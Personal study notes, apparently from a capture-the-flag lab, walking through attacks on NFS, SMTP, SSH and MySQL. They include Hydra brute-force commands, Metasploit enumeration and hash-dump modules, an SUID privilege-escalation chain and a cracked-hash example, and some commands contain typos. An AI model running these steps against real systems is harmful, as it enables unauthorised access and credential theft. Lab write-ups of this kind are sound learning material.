---
tags:
  - programming/hacking/networking
---
# Network Services 3

First off we need to enumerate the machine - this is, we need to find potential attack vectors on the target machine. First off, let's get the tools to actually connect via NFS

	sudo apt install nfs-common

Now let's do a port scan. This was covered elsewhere, but let's put it here in case I can't remember it.... which I can't. 

	# set ip address for later use
	ipaddr=10.10.120.139
	nmap $ipaddr -oN ./01_nmap.log # -oN will output to file

Now we want to show the directory availbe on the NFS

	/usr/sbin/showmount -e $ipaddr

Now mount it

	mkdir /tmp/mount # Create a mount point
	sudo mount -t nfs IP:share /tmp/mount/ -nolock

"-t nfs" tell the type, "-nolock" will not use NLM locking (?). Or, since we know the filename and the address and have it set already, the full command would be

	sudo mount -t nfs "$ipaddr":home /tmp/mount/ -nolock

TADAH! Magic

## Exploiting NFS

Now we want to try and escalate privileges. NFS usually has root-squash enable which means you can't get root through it. But if it does not then we're in business. This is done by uploading an SUID file and executing it.  SUID means the file executes as the file's owner instead of whoever actually is calling it. Very useful. 

NFS access -> low priv shell -> upload bash file -> set SUID permission -> login through ssh -> execute SUID bit -> ROOT baby!



## SMTP

Email communication. Simple Mail Transfer Protocol. Has two internal commands VRFY to verify users and EXPN which
verifies usernames and gets user aliases and lists of email. Metasploit (of course) has ways to exploit this. So that's
do it!

Using metasploit here we will be getting information from ther server and enumerating the users. 

```
msfconsole

search smtp_version

use 0
set RHOSTS XX.XX.XX.XXX
run
```

This will give us the version of SMTP being used and then we can enumerator the users

```bash
search smtp_enum
set RHOSTS XX.XX.XX.XXX
set UESR_FILES /path/to/wordlist.txt
run
```
Username we get back is "administrator"

Sweet, we got a username and let's break the system!

### Getting Password with Hydra

For more info, see [Hydra](Hydra.md)

Command to use:
```
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.119.168 ssh


Options for the command:
```
-t 16
	Number of parallel connections per target
-l [user]	Points to the user who's account you're trying to compromise
-P [path to dictionary]	Points to the file containing the list of possible passwords
-vV
	Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]	The IP address of the target machine
ssh / protocol	Sets the protocol
```

Dang, that worked great! Now that we have the password, let's go ahead and log in to ssh. 

```
ssh user@#ipaddr
# enter password
```

## mysql

There is some explaination as to what SQL databases are, but we know this already. Put data into a database and 
it relates to other data which help to deduplicate data. Good good. 

### Exploiting MySQL database

You can brute force passwords if you really want to get into a system but that is most likely not the best option. 
Usually we get credentials from a different method and work our way in from there. In this case we will assume that we
have gotten some credentials. "root:password" in this case, and that we have tried logging in via ssh with no luck

First, let's get mysql client

```
sudo apt install default-mysql-client
```

Fire up metaspoit and run `db_nmap -sV IPADDR` and see what we can see. MySQL is running on posrt 3306, so let's see if
we can connect to that using `mysql -h [IP] -u [username] -p"`

We can use the mysql_sql module to run attacks against a mysql database. Just need search, use, set some parameters and
we're good to go

#### Exploiting mysql

Let's get to the fun part - actually exploiting the database

We can run `mysql_schemadump` and get the databases the exist. Which is interesting but not terribly fun. We can also
use `mysql_hashdump` to get usernames and password hashes. In this case we get

```
    carl:*EA031893AA21444B170FC2162A56978B8CEECE18
```

Copy that password hash and let's see if we can crack it wide open. Time for john the ripper!

```
    john ./02_hash.txt
```
